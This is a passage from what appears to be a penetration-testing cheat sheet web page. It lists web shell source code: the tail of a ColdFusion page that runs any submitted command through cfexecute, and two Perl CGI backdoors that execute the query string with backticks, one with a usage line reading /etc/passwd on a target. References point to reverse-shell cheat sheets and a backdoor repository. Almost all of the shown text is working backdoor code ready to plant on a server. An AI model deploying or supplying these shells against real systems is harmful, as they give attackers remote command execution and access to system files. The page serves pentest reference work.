&lt;/ul&gt;
&lt;p&gt;
&lt;cfoutput&gt;
&lt;table&gt;
&lt;form method="POST" action="cfexec.cfm"&gt;
&lt;tr&gt;&lt;td&gt;Command:&lt;/td&gt;&lt;td&gt;&lt;input type=text name="cmd" size=50 
  &lt;cfif isdefined("form.cmd")&gt;value="#form.cmd#"&lt;/cfif&gt;&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Options:&lt;/td&gt;&lt;td&gt; &lt;input type=text name="opts" size=50 
  &lt;cfif isdefined("form.opts")&gt;value="#form.opts#"&lt;/cfif&gt;&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Timeout:&lt;/td&gt;&lt;td&gt; &lt;input type=text name="timeout" size=4 
  &lt;cfif isdefined("form.timeout")&gt;value="#form.timeout#"
  &lt;cfelse&gt;value="5"&lt;/cfif&gt;&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;input type=submit value="Exec" &gt;
&lt;/FORM&gt;
&lt;cfif isdefined("form.cmd")&gt;
&lt;cfsavecontent variable="myVar"&gt;
&lt;cfexecute name = "#Form.cmd#"
   arguments = "#Form.opts#" 
   timeout = "#Form.timeout#"&gt;
&lt;/cfexecute&gt;
&lt;/cfsavecontent&gt;
&lt;pre&gt;
#myVar#
&lt;/pre&gt;
&lt;/cfif&gt;
&lt;/cfoutput&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;!-- Contributed by Kurt Grutzmacher (http://grutz.jingojango.net/exploits/) --&gt;
&lt;!--    http://michaeldaw.org   04/2007    --&gt;
</code></pre></div>

<h3>Perl</h3>

<p>With CGIs:</p>

<div class="highlight"><pre class="highlight perl"><code><span class="c1">#!/usr/bin/perl -w</span>
<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Cache-Control: no-cache</span><span class="se">\n</span><span class="p">";</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>

<span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
    <span class="nb">chomp</span> <span class="p">(</span><span class="nv">$req</span><span class="p">);</span>
    <span class="nv">$req</span> <span class="o">=~</span> <span class="sr">s/%20/ /g</span><span class="p">;</span> 
    <span class="nv">$req</span> <span class="o">=~</span> <span class="sr">s/%3b/;/g</span><span class="p">;</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;html&gt;&lt;body&gt;</span><span class="p">";</span>
<span class="k">print</span> <span class="p">'</span><span class="s1">&lt;!-- Simple CGI backdoor by DK (http://michaeldaw.org) --&gt;</span><span class="p">';</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$req</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">print</span> <span class="p">"</span><span class="s2">Usage: http://target.com/perlcmd.cgi?cat /etc/passwd</span><span class="p">";</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="k">print</span> <span class="p">"</span><span class="s2">Executing: </span><span class="si">$req</span><span class="p">";</span>
    <span class="p">}</span>

    <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;pre&gt;</span><span class="p">";</span>
    <span class="k">my</span> <span class="nv">@cmd</span> <span class="o">=</span> <span class="p">`</span><span class="si">$req</span><span class="p">`;</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/pre&gt;</span><span class="p">";</span>

    <span class="k">foreach</span> <span class="k">my</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">print</span> <span class="nv">$line</span> <span class="o">.</span> <span class="p">"</span><span class="s2">&lt;br/&gt;</span><span class="p">";</span>
    <span class="p">}</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/body&gt;&lt;/html&gt;</span><span class="p">";</span>
<span class="c1"># &lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<p>With GET parameter:</p>

<div class="highlight"><pre class="highlight perl"><code><span class="c1">#!/usr/bin/perl -w</span>
<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Cache-Control: no-cache</span><span class="se">\n</span><span class="p">";</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>

<span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
    <span class="nb">chomp</span> <span class="p">(</span><span class="nv">$req</span><span class="p">);</span>
    <span class="nv">$req</span> <span class="o">=~</span> <span class="sr">s/%20/ /g</span><span class="p">;</span> 
    <span class="nv">$req</span> <span class="o">=~</span> <span class="sr">s/%3b/;/g</span><span class="p">;</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;html&gt;&lt;body&gt;</span><span class="p">";</span>
<span class="k">print</span> <span class="p">'</span><span class="s1">&lt;!-- Simple CGI backdoor by DK (http://michaeldaw.org) --&gt;</span><span class="p">';</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$req</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">print</span> <span class="p">"</span><span class="s2">Usage: http://target.com/perlcmd.cgi?cat /etc/passwd</span><span class="p">";</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="k">print</span> <span class="p">"</span><span class="s2">Executing: </span><span class="si">$req</span><span class="p">";</span>
    <span class="p">}</span>

    <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;pre&gt;</span><span class="p">";</span>
    <span class="k">my</span> <span class="nv">@cmd</span> <span class="o">=</span> <span class="p">`</span><span class="si">$req</span><span class="p">`;</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/pre&gt;</span><span class="p">";</span>

    <span class="k">foreach</span> <span class="k">my</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">print</span> <span class="nv">$line</span> <span class="o">.</span> <span class="p">"</span><span class="s2">&lt;br/&gt;</span><span class="p">";</span>
    <span class="p">}</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/body&gt;&lt;/html&gt;</span><span class="p">";</span>
<span class="c1"># &lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div>

<h2>References</h2>

<ul>
<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li><a href="https://www.revshells.com/" rel="nofollow">https://www.revshells.com/</a></li>
<li><a href="https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp" rel="nofollow">https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp</a></li>
<li><a href="https://github.com/cldrn/davtest" rel="nofollow">https://github.com/cldrn/davtest</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section"></div>
    </footer>
  </body>
</html>

